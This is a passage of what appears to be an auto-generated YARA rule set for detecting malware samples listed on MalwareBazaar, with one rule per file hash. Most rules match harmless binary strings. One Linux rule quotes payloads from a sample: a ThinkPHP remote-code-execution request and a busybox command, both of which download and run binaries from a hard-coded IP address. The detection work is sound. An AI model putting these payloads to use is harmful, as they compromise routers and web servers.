        $s17 = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
        $s18 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5"
        $s19 = "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60"
        $s20 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 113KB and
        all of them
}

rule Windows_7021bb246b002d3f811a913d148f5266de599dfe81acfa60279c5ffab6d80558
{
    meta:
        description = "Auto ML: 7021bb246b002d3f811a913d148f5266de599dfe81acfa60279c5ffab6d80558"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4701KB and
        all of them
}

rule Linux_7034042c7c96871e2a96f1a685394e61d8e3f2022a8228a4c87939fdc332e356
{
    meta:
        description = "Auto ML: 7034042c7c96871e2a96f1a685394e61d8e3f2022a8228a4c87939fdc332e356"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_70369453cd6e8481ce8f2fc4fa4074fb998a27ff6f91bce6caeab0ecac36493b
{
    meta:
        description = "Auto ML: 70369453cd6e8481ce8f2fc4fa4074fb998a27ff6f91bce6caeab0ecac36493b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetSets>d__10"
        $s5 = "<GetPlugIns>b__5_0"
        $s6 = "<GetPlugIns>b__5_1"
        $s7 = "<Module>"
        $s8 = "System.IO"
        $s9 = "get_Data"
        $s10 = "set_Data"
        $s11 = "GetData"
        $s12 = "SetData"
        $s13 = "System.Collections.Generic"
        $s14 = "get_ManagedThreadId"
        $s15 = "<>l__initialThreadId"
        $s16 = "get_CurrentThread"
        $s17 = "OnLoad"
        $s18 = "Reload"
        $s19 = "get_Enabled"
        $s20 = "set_Enabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 659KB and
        all of them
}

rule Windows_703921fd2af99761c29876c1593c7f225607a27eabd5bc1e6b66f2d1283de3d9
{
    meta:
        description = "Auto ML: 703921fd2af99761c29876c1593c7f225607a27eabd5bc1e6b66f2d1283de3d9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "getInstancia"
        $s11 = "get_paginaWebEmpresa"
        $s12 = "set_paginaWebEmpresa"
        $s13 = "get_razonSocialEmpresa"
        $s14 = "set_razonSocialEmpresa"
        $s15 = "get_direccionEmpresa"
        $s16 = "set_direccionEmpresa"
        $s17 = "get_correoEmpresa"
        $s18 = "set_correoEmpresa"
        $s19 = "get_telefonoEmpresa"
        $s20 = "set_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 569KB and
        all of them
}

rule Windows_704922a3365f6b0cb1bb98148720d4b7ff049c0bb370e56d5e3b249b351f0ee7
{
    meta:
        description = "Auto ML: 704922a3365f6b0cb1bb98148720d4b7ff049c0bb370e56d5e3b249b351f0ee7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "System"
        $s4 = "IOffset"
        $s5 = "ImplGetter"
        $s6 = "Create"
        $s7 = "GetInterface"
        $s8 = "GetInterfaceEntry"
        $s9 = "GetInterfaceTable"
        $s10 = "GetHashCode"
        $s11 = "NewInstance"
        $s12 = "PPackageTypeInfo"
        $s13 = "TPackageTypeInfo"
        $s14 = "PLibModule"
        $s15 = "TLibModule"
        $s16 = "Module"
        $s17 = "GetThreadPreferredUILanguages"
        $s18 = "SetThreadPreferredUILanguages"
        $s19 = "GetThreadUILanguage"
        $s20 = "GetLongPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1885KB and
        all of them
}

rule Windows_7067efc25c133206570865eb8e8063d59894e5a3c457e287ca050d6fc3d182d4
{
    meta:
        description = "Auto ML: 7067efc25c133206570865eb8e8063d59894e5a3c457e287ca050d6fc3d182d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "cmdTcH"
        $s3 = "GetModuleHandleA"
        $s4 = "GetProcAddress"
        $s5 = "KERNEL32.DLL"
        $s6 = "USER32.dll"
        $s7 = "GetSystemMetrics"
        $s8 = "CreateCompatibleBitmap"
        $s9 = "ADVAPI32.dll"
        $s10 = "RegCloseKey"
        $s11 = "SHELL32.dll"
        $s12 = "SHGetFolderPathA"
        $s13 = "WININET.dll"
        $s14 = "HttpOpenRequestA"
        $s15 = "gdiplus.dll"
        $s16 = "www.digicert.com1!0"
        $s17 = "http://ocsp.digicert.com0A"
        $s18 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C"
        $s19 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0"
        $s20 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S"
    condition:
        uint32(0) == 0x00405a4d and
        filesize < 4271KB and
        all of them
}

rule Windows_707c4d371a07104b76f811c9efdb9167774e5d8137753adf70e74c4d37c1b55f
{
    meta:
        description = "Auto ML: 707c4d371a07104b76f811c9efdb9167774e5d8137753adf70e74c4d37c1b55f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Window"
        $s7 = "_IMWINDOW"
        $s8 = "#CLOSE"
        $s9 = "###NavWindowingList"
        $s10 = "#WindowMenu"
        $s11 = "Window=0x%08X%n"
        $s12 = "NoWindowMenuButton=%d%n"
        $s13 = "NoCloseButton=%d%n"
        $s14 = "Window=0x%08X"
        $s15 = "NoWindowMenuButton=1"
        $s16 = "NoCloseButton=1"
        $s17 = "imgui_impl_win32"
        $s18 = "xinput1_4.dll"
        $s19 = "xinput1_3.dll"
        $s20 = "xinput9_1_0.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 435KB and
        all of them
}

rule Windows_70c7a7f6c67627aa68aa90151740de9d18661b327d7220cb89ef899974a3384b
{
    meta:
        description = "Auto ML: 70c7a7f6c67627aa68aa90151740de9d18661b327d7220cb89ef899974a3384b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB and
        all of them
}

rule Windows_0af0b4bffa67145e4e5ecd2321bb7790e9c14ed802a7984798fc7c00b6763207
{
    meta:
        description = "Auto ML: 0af0b4bffa67145e4e5ecd2321bb7790e9c14ed802a7984798fc7c00b6763207"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "Microsoft.Win32"
        $s4 = "<Module>"
        $s5 = "PAGE_EXECUTE_READWRITE"
        $s6 = "MEM_RESET_UNDO"
        $s7 = "System.IO"
        $s8 = "MEM_RESET"
        $s9 = "lpThreadId"
        $s10 = "CreateThread"
        $s11 = "get_Message"
        $s12 = "GetTypeFromHandle"
        $s13 = "DownloadFile"
        $s14 = "set_FileName"
        $s15 = "GetDirectoryName"
        $s16 = "WriteLine"
        $s17 = "get_Culture"
        $s18 = "set_Culture"
        $s19 = "ApplicationSettingsBase"
        $s20 = "DebuggerNonUserCodeAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 9KB and
        all of them
}

rule Windows_70d8c9b6b1ca04dfb10ea4cb4a723d0667023cb50f25b9eb1ca9f06bdaad4a07
{
    meta:
        description = "Auto ML: 70d8c9b6b1ca04dfb10ea4cb4a723d0667023cb50f25b9eb1ca9f06bdaad4a07"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1348KB and
        all of them
}

rule Linux_70f41e09e90905173555bd88992cfe1111b4d21b3d291de82196c93dd28520c8
{
    meta:
        description = "Auto ML: 70f41e09e90905173555bd88992cfe1111b4d21b3d291de82196c93dd28520c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data.rel.ro"
        $s11 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB and
        all of them
}

rule Linux_711be1c67b261cb5410e8601e64901e778e08d3fb96aaaa59efca1cd33a2e332
{
    meta:
        description = "Auto ML: 711be1c67b261cb5410e8601e64901e778e08d3fb96aaaa59efca1cd33a2e332"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1128KB and
        all of them
}

rule Windows_712a592c28a3ee66e5023a1abddb900c22470a22502eb4f71ff50a9e816df18a
{
    meta:
        description = "Auto ML: 712a592c28a3ee66e5023a1abddb900c22470a22502eb4f71ff50a9e816df18a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
    condition:
        uint32(0) == 0x00805a4d and
        filesize < 39KB and
        all of them
}

rule Linux_71551d0ed6f6767b76f9e4c9973bbc8b39c346f7a74faef65606f109ad6db633
{
    meta:
        description = "Auto ML: 71551d0ed6f6767b76f9e4c9973bbc8b39c346f7a74faef65606f109ad6db633"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB and
        all of them
}

rule Linux_715640a7e295ce0ecc07be1cc686389f1d8f9d57cd12cb8202e142cc61ddb425
{
    meta:
        description = "Auto ML: 715640a7e295ce0ecc07be1cc686389f1d8f9d57cd12cb8202e142cc61ddb425"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s5 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Linux_719fc6fb01f9caa78a85458980ab5fbdb1d5efa485bc1cf4915af7de4414eb90
{
    meta:
        description = "Auto ML: 719fc6fb01f9caa78a85458980ab5fbdb1d5efa485bc1cf4915af7de4414eb90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB and
        all of them
}

rule Windows_71f7d548c9ea57b8c9dcc3f426adabdddb4451e65837b63c4c25dc2a812717e2
{
    meta:
        description = "Auto ML: 71f7d548c9ea57b8c9dcc3f426adabdddb4451e65837b63c4c25dc2a812717e2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "<http>5__2"
        $s6 = "<GetFromUri>d__9"
        $s7 = "<Module>"
        $s8 = "System.IO"
        $s9 = "System.Data"
        $s10 = "set_Verb"
        $s11 = "DownloadStringAsync"
        $s12 = "GetStringAsync"
        $s13 = "Read"
        $s14 = "Thread"
        $s15 = "Form2_Load"
        $s16 = "add_Load"
        $s17 = "set_FormattingEnabled"
        $s18 = "get_IsCompleted"
        $s19 = "ReadToEnd"
        $s20 = "RegistryValueKind"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 23KB and
        all of them
}

rule Windows_71fba6519b70623172170c020fc75c855669922971e09bd94c2ed4d21655334a
{
    meta:
        description = "Auto ML: 71fba6519b70623172170c020fc75c855669922971e09bd94c2ed4d21655334a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "hwiniThLw&"
        $s6 = "fclose"
        $s7 = "fopen"
        $s8 = "_close"
        $s9 = "MSVCRT.dll"
        $s10 = "__getmainargs"
        $s11 = "__setusermatherr"
        $s12 = "__set_app_type"
        $s13 = "SetLastError"
        $s14 = "GetEnvironmentStringsW"
        $s15 = "GetCommandLineW"
        $s16 = "GetCurrentProcess"
        $s17 = "SetHandleInformation"
        $s18 = "CloseHandle"
        $s19 = "GetSystemTimeAsFileTime"
        $s20 = "FileTimeToSystemTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB and
        all of them
}

rule Linux_721fa43eb953cbda4bce3c6a4a84fd4e56965ffe9afd7ff8cdb8ac35ecf1d487
{
    meta:
        description = "Auto ML: 721fa43eb953cbda4bce3c6a4a84fd4e56965ffe9afd7ff8cdb8ac35ecf1d487"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s5 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Linux_00d1ba77f0d593cd12960d553490a22f5e9b9154a5af549e5f7003a4a62d1207
{
    meta:
        description = "Auto ML: 00d1ba77f0d593cd12960d553490a22f5e9b9154a5af549e5f7003a4a62d1207"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Windows_0b1802c98ca323c87cdb2f64b9165e73ca6a505cbc9f8273c14d0a71df0fa769
{
    meta:
        description = "Auto ML: 0b1802c98ca323c87cdb2f64b9165e73ca6a505cbc9f8273c14d0a71df0fa769"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "System"
        $s7 = "get_Computer"
        $s8 = "get_Application"
        $s9 = "User"
        $s10 = "get_User"
        $s11 = "m_UserObjectProvider"
        $s12 = "get_WebServices"
        $s13 = "GetHashCode"
        $s14 = "GetType"
        $s15 = "Create__Instance__"
        $s16 = "get_GetInstance"
        $s17 = "m_ThreadStaticValue"
        $s18 = "GetInstance"
        $s19 = "System.Text"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 36KB and
        all of them
}

rule Windows_723d9539fcce3f6558051ac7fe5cd3848e057891bd562d090f860ef475922373
{
    meta:
        description = "Auto ML: 723d9539fcce3f6558051ac7fe5cd3848e057891bd562d090f860ef475922373"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Condition.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{64200D16-6CD3-41DE-A280-007C2ED3972D}"
        $s15 = "<Module>{e1ec07c0-3412-452c-8edd-ed31d6a66709}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "hProcess"
        $s19 = "lpThreadAttributes"
        $s20 = "lpThreadId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB and
        all of them
}

rule Linux_725683b249e23ec55e5fc458971de13f5057e853ed71206cb32c75a1248021cd
{
    meta:
        description = "Auto ML: 725683b249e23ec55e5fc458971de13f5057e853ed71206cb32c75a1248021cd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "httpd\""
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_72ce7e97ea68b817452d8e25f7070623450828230a1c21d640b6f888d3cf29fc
{
    meta:
        description = "Auto ML: 72ce7e97ea68b817452d8e25f7070623450828230a1c21d640b6f888d3cf29fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2312KB and
        all of them
}

rule Windows_72e6aecc1e7172bb885e9454ae448965526b1cecfa6324a03e6c890b464f3533
{
    meta:
        description = "Auto ML: 72e6aecc1e7172bb885e9454ae448965526b1cecfa6324a03e6c890b464f3533"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "developed_from_statistics.exe"
        $s14 = "<Module>"
        $s15 = "ThreadSafeObjectProvider`1"
        $s16 = "MySettings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
        $s19 = "MySettingsProperty"
        $s20 = "System.Windows.Forms"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4385KB and
        all of them
}

rule Windows_73116da30f395c43e5c2d0ec688c1d11932d82a9db6733fa1b563ef377aa679e
{
    meta:
        description = "Auto ML: 73116da30f395c43e5c2d0ec688c1d11932d82a9db6733fa1b563ef377aa679e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1669KB and
        all of them
}

rule Windows_731919b308730b743aaac49f719a402faa76afcfb3d0d52412a1cd1b399b4fbb
{
    meta:
        description = "Auto ML: 731919b308730b743aaac49f719a402faa76afcfb3d0d52412a1cd1b399b4fbb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "P.reloc"
        $s3 = "P.rsrc"
        $s4 = "kernel32.dll"
        $s5 = "GetLongPathNameA"
        $s6 = "GetDiskFreeSpaceExA"
        $s7 = "DeleteCriticalSection"
        $s8 = "GetVersion"
        $s9 = "GetCurrentThreadId"
        $s10 = "LoadLibraryExA"
        $s11 = "GetThreadLocale"
        $s12 = "GetStartupInfoA"
        $s13 = "GetProcAddress"
        $s14 = "GetModuleHandleA"
        $s15 = "GetModuleFileNameA"
        $s16 = "GetLocaleInfoA"
        $s17 = "GetCommandLineA"
        $s18 = "FindFirstFileA"
        $s19 = "FindClose"
        $s20 = "ExitProcess"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 42KB and
        all of them
}

rule Linux_7362348a80fb103636d133cf71ee6eee603ce3c3ecc1168b8715885b595a5fdf
{
    meta:
        description = "Auto ML: 7362348a80fb103636d133cf71ee6eee603ce3c3ecc1168b8715885b595a5fdf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB and
        all of them
}

rule Windows_7381e44bceb1a34fe308780ad1aca1bf5298ef5fcad8e3a1fde188755bcc333e
{
    meta:
        description = "Auto ML: 7381e44bceb1a34fe308780ad1aca1bf5298ef5fcad8e3a1fde188755bcc333e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB and
        all of them
}

rule Windows_739390cb2a8719293c06192017f6164ed68e569f5d259de14f17e9b6dee8ea44
{
    meta:
        description = "Auto ML: 739390cb2a8719293c06192017f6164ed68e569f5d259de14f17e9b6dee8ea44"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4013KB and
        all of them
}

rule Windows_73c156ea9e0695256567a9f2b6a140f9758423880f971b20d5e9e2875a9ca036
{
    meta:
        description = "Auto ML: 73c156ea9e0695256567a9f2b6a140f9758423880f971b20d5e9e2875a9ca036"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s7 = "Failed to extract %s: failed to allocate temporary output buffer!"
